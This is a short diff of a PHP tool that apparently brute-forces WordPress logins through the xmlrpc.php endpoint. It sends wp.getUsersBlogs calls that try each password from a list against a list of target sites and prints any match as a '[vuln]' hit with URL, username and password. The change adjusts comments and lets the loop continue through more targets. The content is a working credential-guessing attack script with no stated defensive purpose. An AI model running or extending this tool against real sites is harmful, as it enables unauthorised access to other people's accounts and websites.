@@ -22,11 +22,11 @@ foreach ($endpoints as $endpoint) {
         $brute->requestXml($endpoint, $fields);
         $result = $brute->getRequestResult();
         if(!$result) {
-            continue; // target seems to be not vulnerable
+            continue; // not xml result check xmlrpc.php in your target lists
         }
 
         if (!$brute->searchArray('wp.getUsersBlogs', $result)) {
-            return false; // target seems to be not vulnerable
+            continue; // target seems to be not vulnerable
         }
 
         for ($x = 0; $x < $passwordListCount; $x++) {
@@ -42,6 +42,7 @@ foreach ($endpoints as $endpoint) {
                 </methodCall>', $username, $passwordLists[$x]);
             $brute->requestXml($endpoint, $fields);
             $result = $brute->getRequestResult();
+            
             if (!$brute->searchArray('403', $result)) {
                 echo '[vuln] url: ', $endpoint, ' username: ', $username, ' password: ', $passwordLists[$x], "\n";
             }
